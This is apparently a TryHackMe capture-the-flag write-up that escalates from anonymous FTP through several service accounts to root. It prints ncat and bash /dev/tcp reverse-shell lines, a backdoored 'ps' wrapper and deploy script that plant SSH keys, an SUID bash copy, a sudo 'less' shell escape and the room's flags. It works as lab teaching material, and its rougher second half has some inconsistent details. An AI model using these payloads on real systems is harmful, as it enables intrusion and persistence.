# 🚩 TryHackMe - Linux Trust Boundary Privilege Escalation

<p align="center">
<img src="https://img.shields.io/badge/Platform-TryHackMe-red">
<img src="https://img.shields.io/badge/Difficulty-Medium-orange">
<img src="https://img.shields.io/badge/OS-Linux-blue">
<img src="https://img.shields.io/badge/Category-Privilege%20Escalation-success">
<img src="https://img.shields.io/badge/Status-Completed-brightgreen">
</p>

---

# 📖 Introduction

Today we are back again with another **TryHackMe Linux Privilege Escalation** challenge. Unlike traditional Linux machines where privilege escalation normally consists of moving from a low-privileged user directly to root, this challenge is built around **multiple trust boundaries** between different service accounts.

Instead of exploiting a single vulnerability, the objective is to abuse weak permissions, writable scripts, scheduled automation jobs, poorly designed deployment mechanisms, and insecure sudo configurations to move laterally across several users before finally obtaining root privileges.

This machine is an excellent demonstration of how small permission mistakes throughout an environment can combine into a complete system compromise.

---

# 🎯 Scenario

The scenario provided is:

> *You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.*

Our objective is to successfully escalate through every stage of the environment.

```text
Anonymous FTP
        │
        ▼
recon_user
        │
        ▼
dev_user
        │
        ▼
monitor_user
        │
        ▼
ops_user
        │
        ▼
root
```

---

# 🖥️ Target Information

| Field            | Value       |
| ---------------- | ----------- |
| Platform         | TryHackMe   |
| Difficulty       | Medium      |
| Operating System | Linux       |
| Target IP        | 10.49.129.2 |

---

# 🔍 Enumeration

As always, the first step is to enumerate the target and understand the available attack surface.

We'll begin by performing a full TCP scan using **Nmap**.

```bash
nmap -p- -T4 10.49.129.2
```

The scan returns only two open ports.

```
21/tcp  FTP
22/tcp  SSH
```

Since the attack surface is very limited, every exposed service becomes important.

---

# 🔎 Service Enumeration

Next, perform service and version detection.

```bash
nmap -sC -sV 10.49.129.2
```

Results:

| Port | Service | Version              |
| ---- | ------- | -------------------- |
| 21   | FTP     | vsftpd 3.0.5         |
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |

One particularly interesting discovery immediately stands out.

```
Anonymous FTP login allowed
```

Anonymous FTP access is frequently worth investigating because administrators often expose files unintentionally or configure writable directories that can later be abused.

---

# 📂 FTP Enumeration

Connecting anonymously:

```bash
ftp 10.49.129.2
```

After authentication we inspect the directory structure.

```
.
README.txt
archive/
uploads/
```

Directory permissions:

```
archive/
uploads/
```

The **uploads** directory is world writable.

```
drwxrwxrwx
```

Immediately this becomes the most interesting directory because writable upload locations are commonly processed by automated services.

---

# 📄 README Analysis

The README contains:

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.

Files are processed automatically on arrival.

Invalid formats are ignored.
```

Although the current FTP directory exposes **uploads**, the message clearly references an **incoming** processing pipeline.

This strongly suggests that uploaded files are automatically handled by some backend automation running under another user account.

Instead of simply being file storage, FTP appears to act as the entry point into an automated recon workflow.

This is the first trust boundary within the machine.

```
FTP
        │
        ▼
Recon Pipeline
        │
        ▼
Recon User
```

---

# 💡 Initial Access Strategy

Based on the README, the likely attack path is:

1. Upload a valid recon job.
2. Wait for the automation pipeline.
3. Allow the backend process to execute it.
4. Receive execution as another user.

This is a classic example of abusing an insecure automation pipeline.

Rather than exploiting software vulnerabilities, we are exploiting **trusted automation**.

---

# 🚀 Initial Access

A simple reverse shell script is prepared.

Example:

```bash
ncat <ATTACKER-IP> 4444 -e /bin/bash
```

After placing the payload where the recon pipeline expects it, we start a listener.

```bash
nc -lvnp 4444
```

Shortly afterwards the connection is received.

```
connect to [ATTACKER-IP]
```

Checking our identity confirms successful code execution.

```bash
whoami
```

Output:

```
recon_user
```

The initial foothold has been obtained successfully.

---

# 🖥️ Shell Stabilization

Interactive shells obtained through reverse connections are usually unstable.

To make the session easier to work with, the shell is upgraded.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Suspend:

```
CTRL+Z
```

Configure the local terminal:

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm
```

The shell is now fully interactive.

---

# 🚩 Recon User

We can now inspect the environment as **recon_user**.

Current user:

```
recon_user
```

While exploring the filesystem we discover that another user's home directory is readable.

```
/home/dev_user
```

Inside we immediately locate:

```
flag.txt
```

Reading the flag:

```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

This demonstrates one of the intentional weaknesses within the challenge—poor separation between user permissions.

Although we have not yet become **dev_user**, we are already capable of reading data belonging to that account.

---

# 🔍 Local Enumeration

Rather than immediately running automated tools, some manual enumeration is performed first.

One directory quickly stands out.

```
/opt
```

Listing the contents reveals multiple application folders.

```
app/
dev/
recon/
```

Ownership immediately becomes interesting.

```
ops_user
dev_user
recon_user
```

This strongly indicates that every stage of the automation pipeline is isolated into its own directory.

Since the room specifically revolves around moving through trust relationships, these folders deserve careful inspection.

---

# 📂 Investigating /opt/dev

Inside the development directory we discover:

```
backup.sh
```

Permissions:

```
-rwxrwxr-x
```

Owner:

```
dev_user
```

Most importantly:

The script is writable by **recon_user**.

This is an extremely dangerous permission configuration.

A scheduled backup script executed by another user should never be writable by a lower privileged account.

Reading the script shows:

```bash
#!/bin/bash

tar -czf /tmp/recon_backup.tgz /home/recon_user
```

The script simply creates a compressed archive of the recon user's home directory.

However, because we possess write permissions, the script can be modified before it executes.

At this point we have identified the next trust boundary within the system.

```
recon_user
        │
Writable Backup Script
        │
        ▼
dev_user
```

Instead of exploiting software vulnerabilities, we are once again abusing **insecure trust relationships created through improper file permissions**.

Today we are back again with another TryHackMe Challenge for Linux machine and with the scenario.


You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.

Your objective is to escalate from anonymous access all the way through:

recon_user → dev_user → monitor_user → ops_user → root

So Main IP :: 10.49.129.2


Let's now perform the all port scan with nmap.

Nmap scan report for ip-10-49-129-2.ap-south-1.compute.internal (10.49.129.2)
Host is up, received echo-reply ttl 64 (0.00014s latency).
Scanned at 2026-06-26 04:23:49 UTC for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64


So let's perform service and version detection scan on here.

Nmap scan report for 10.49.129.2
Host is up, received echo-reply ttl 62 (0.048s latency).
Scanned at 2026-06-26 04:25:10 UTC for 5s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.138.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
|_drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:8b:16:57:31:e6:4f:1a:a7:da:f7:40:9c:48:c2:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBETKmaC+gkaok5p5FLoQXRr9DpIhmGcHh0BS1VCIgp9VJfYD5Lh97rA2hyF8LmWWcG7SyxbW2krHwD7CQPQ3vv4=
|   256 e5:6c:50:20:02:32:ee:01:05:08:ec:f6:b6:b6:d1:0e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICnsLcNT+18KPWfxtnRIdgBCFWU24W05adREH4c/i9JY
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



So today we have no open web server ports but the ftp is allowed today so let's take a deep look at the ftp.

ls -alh
229 Entering Extended Passive Mode (|||41740|)
150 Here comes the directory listing.
drwxr-xr-x    4 115      123          4096 Jun 09 08:22 .
drwxr-xr-x    4 0        0            4096 Feb 02 06:29 ..
-rw-r--r--    1 0        0             139 Feb 02 07:19 README.txt
drwxr-xr-x    2 115      123          4096 Feb 01 11:12 archive
drwxrwxrwx    2 115      123          4096 Feb 01 11:12 uploads
226 Directory send OK.


So we see this and other directories are empty here.

cat README.txt         
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.


So with this we have got the hint here.

that recon jobs must be placed in /incoming.

─(root㉿kali)-[/home/kali/thm/jump]
└─# cat s3.sh 
ncat 192.168.138.6 4444 -e /bin/bash
                                       
                                       so with this 
                                       
we just got the shell now we will stabilize it.

 nc -lvnp 4444                            
listening on [any] 4444 ...
connect to [192.168.138.6] from (UNKNOWN) [10.49.129.2] 46118
ls
flag.txt
shell.sh
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
recon_user@tryhackme-2404:~$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                     
┌──(root㉿kali)-[/home/kali/thm/jump]
└─# stty raw -echo
fg

[1]  + continued  nc -lvnp 4444

recon_user@tryhackme-2404:~$ export TERM=xterm
recon_user@tryhackme-2404:~$ 


Now we get the flag from here.

:/home/dev_user$ cat flag.txt 
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
recon_user@tryhackme-2404:/home/dev_user$ 
so as recon user we can also get the dev_user flag also maybe both the user might be at 

the same privilege let's try to run linpeas or look at the file systems.

SO roaming around the file system we find interesting things in to the /opt directory

/opt$ ls -lah
total 20K
drwxr-xr-x  5 root       root       4.0K Feb  2 10:03 .
drwxr-xr-x 22 root       root       4.0K Jun 26 04:17 ..
drwxr-xr-x  3 ops_user   ops_user   4.0K Feb  2 15:09 app
drwxrwxr-x  3 dev_user   dev_user   4.0K Jun 26 04:44 dev
drwxr-xr-x  2 recon_user recon_user 4.0K Jun 26 04:44 recon

and in to the dev we have backup.sh file which is writeable by our recon_user.

ser 4.0K Jun 26 04:44 .
drwxr-xr-x 5 root     root     4.0K Feb  2 10:03 ..
-rwxrwxr-x 1 dev_user dev_user   60 Jun  9 09:03 backup.sh
drwxr-xr-x 2 dev_user dev_user 4.0K Apr 26 18:19 bin
recon_user@tryhackme-2404:/opt/dev$ cat backup.sh 
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user

So with this we will put the reverse shell.

 cat backup.sh 
#!/bin/bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/10.49.129.2/5556 0>&1
bash -i >& /dev/tcp/10.49.129.2/5556 0>&1
bash -i >& /dev/tcp/10.49.129.2/5556 0>&1
bash -i >& /dev/tcp/10.49.129.2/5556 0>&1
bash -i >& /dev/tcp/10.49.129.2/5556 0>&1
sh -i >& /dev/tcp/192.168.138.6/5556 0>&1

\
So moving with this and let's 

to get the shell for us.

so with this we get the revershell

now as dev_userev_user@tryhackme-2404:~$ whoami
dev_user
dev_user@

let's look at the deeper analysis.

so as dev user we are running the pspy64 which look after the hidden backend linux processes that will be helpful for us.


so with pspy64 we saw the health check utility and this ps command that are editables.

 nano /opt/dev/bin/ps
dev_user@tryhackme-2404:/tmp$ cat /opt/dev/bin/ps
#!/bin/bash
setsid bash -i >& /dev/tcp/10.82.84.138/5557 0>&1

mkdir -p /home/monitor_user/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSLw6ln7Wlgx05LIFliaBpXKZB8ZF4oEbpFprGqnsk2IQ5pE1DOxLjxmhy5/fG7TbazrE6uju/6L5Tgg8PCqSomkhT/zenmhMfRziXadSZ0pdVdXNWgUj1EEHrkrixPuPQsf1bExlgKBJxka7WOJElZJ7r0BLuHAKog2cH0iQXkHHpaYb+za24tQyIinBXlrockb+hN30C/6tAWTeKV0oTeAVhI/a5WlSBT2xk8/OElfVMTe9cOhhjNVS0Dp6sp+4D3Df2QPOI7p4bxVqMGlRNjJFK0GISmUMq6RP1DKK7xFqY/safjkh2sr/yJo9aHRRNTYvbJX8oGPKrGRDJk/KVDRzWb7w41vdLhsLp1GnQYQs5ipKTLahKD5Xl8x1aU18teOEcLMRiPnSC7bNAOM9OMeufhO0oFVV/U7QJI3RVnkqeMk/IkNU3G51qghD+FHYZEFFkE3v39D42iwj4f0d6ouCwalXE4TWDbcZZGVNw5CY4WwUxoPa3+kEVE+3UE= root@kali
' >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys

cp /bin/bash /tmp/monitorbash
chmod 4755 /tmp/bash

/usr/bin/ps "$@"
dev_user@tryhackme-2404:/tmp$ 

so we did this and we will try to run pspy64 again to see if it working or not.


So with this we are logged into the shell.

# ssh -i /root/.ssh/id_rsa monitor_user@10.49.129.2
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-1013-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Jun 26 05:37:09 UTC 2026

  System load:  0.09               Temperature:           -273.1 C
  Usage of /:   11.3% of 72.63GB   Processes:             155
  Memory usage: 52%                Users logged in:       0
  Swap usage:   0%                 IPv4 address for ens5: 10.49.129.2

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ whoami 
monitor_user
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

stabilized the shell and get the flag now.

hackme-2404:~$ cat flag.txt 
THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
monitor_user@tryhackme


TIME FOR PRIVILEGE ESCALATION - 1 ::

sudo -l
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
monitor_user@tryhackme-2404:~$ 


As again we will do this adding keys and will run the binary

mkdir -p /home/ops_user/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSLw6ln7Wlgx05LIFliaBpXKZB8ZF4oEbpFprGqnsk2IQ5pE1DOxLjxmhy5/fG7TbazrE6uju/6L5Tgg8PCqSomkhT/zenmhMfRziXadSZ0pdVdXNWgUj1EEHrkrixPuPQsf1bExlgKBJxka7WOJElZJ7r0BLuHAKog2cH0iQXkHHpaYb+za24tQyIinBXlrockb+hN30C/6tAWTeKV0oTeAVhI/a5WlSBT2xk8/OElfVMTe9cOhhjNVS0Dp6sp+4D3Df2QPOI7p4bxVqMGlRNjJFK0GISmUMq6RP1DKK7xFqY/safjkh2sr/yJo9aHRRNTYvbJX8oGPKrGRDJk/KVDRzWb7w41vdLhsLp1GnQYQs5ipKTLahKD5Xl8x1aU18teOEcLMRiPnSC7bNAOM9OMeufhO0oFVV/U7QJI3RVnkqeMk/IkNU3G51qghD+FHYZEFFkE3v39D42iwj4f0d6ouCwalXE4TWDbcZZGVNw5CY4WwUxoPa3+kEVE+3UE= root@kali
' >> /home/ops_user/.ssh/authorized_keys
chmod 700 /home/ops_user/.ssh
chmod 600 /home/ops_user/.ssh/authorized_keys



04:~$ cat /usr/local/bin/deploy.sh 
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
monitor_user@tryhackme-2404:~$ nano /opt/app/deploy_helper.sh 
monitor_user@tryhackme-2404:~$ cat /opt/app/deploy_helper.sh 
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2

mkdir -p /home/ops_user/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSLw6ln7Wlgx05LIFliaBpXKZB8ZF4oEbpFprGqnsk2IQ5pE1DOxLjxmhy5/fG7TbazrE6uju/6L5Tgg8PCqSomkhT/zenmhMfRziXadSZ0pdVdXNWgUj1EEHrkrixPuPQsf1bExlgKBJxka7WOJElZJ7r0BLuHAKog2cH0iQXkHHpaYb+za24tQyIinBXlrockb+hN30C/6tAWTeKV0oTeAVhI/a5WlSBT2xk8/OElfVMTe9cOhhjNVS0Dp6sp+4D3Df2QPOI7p4bxVqMGlRNjJFK0GISmUMq6RP1DKK7xFqY/gzpvjyvC2sr/yJo9aHRRNTYvbJX8oGPKrGRDJk/KVDRzWb7w41vdLhsLp1GnQYQs5ipKTLahKD5Xl8x1aU18teOEcLMRiPnSC7bNAOM9OMeufhO0oFVV/U7QJI3RVnkqeMk/IkNU3G51qghD+FHYZEFFkE3v39D42iwj4f0d6ouCwalXE4TWDbcZZGVNw5CY4WwUxoPa3+kEVE+3UE= root@kali' >> /home/ops_user/.ssh/authorized_keys
chmod 700 /home/ops_user/.ssh
chmod 600 /home/ops_user/.ssh/authorized_keys

Doing this we can look at this.

 sudo -u ops_user /usr/local/bin/deploy.sh 
[+] Deploy helper running
[+] Syncing application files
monitor_user@tryhackme-2404:~$ 

now it did it's work let's now try to connect as ops_user.

now we get the shell as ops_user.


cat flag.txt 
THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
ops_user@tryhackme-2404:~$ 


TIME FOR PRIVILEGE ESCALATION - 2 :: 

ops_user@tryhackme-2404:~$ sudo -l
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less

so with sudo /usr/bin/less /root/flag.txt we can read the flag.

THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}

less /etc/hosts
!/bin/sh

~$ sudo /usr/bin/less /root/flag.txt
ops_user@tryhackme-2404:~$ sudo /usr/bin/less /etc/hosts
# 

and also with this we are root user.

ops_user@tryhackme-2404:~$ sudo /usr/bin/less /root/flag.txt
ops_user@tryhackme-2404:~$ sudo /usr/bin/less /etc/hosts
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /ro       ^Ho^H
cat: /ro: No such file or directory
cat: ''$'\b''o'$'\b': No such file or directory
# cat /root/flag.txt
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
# 


---
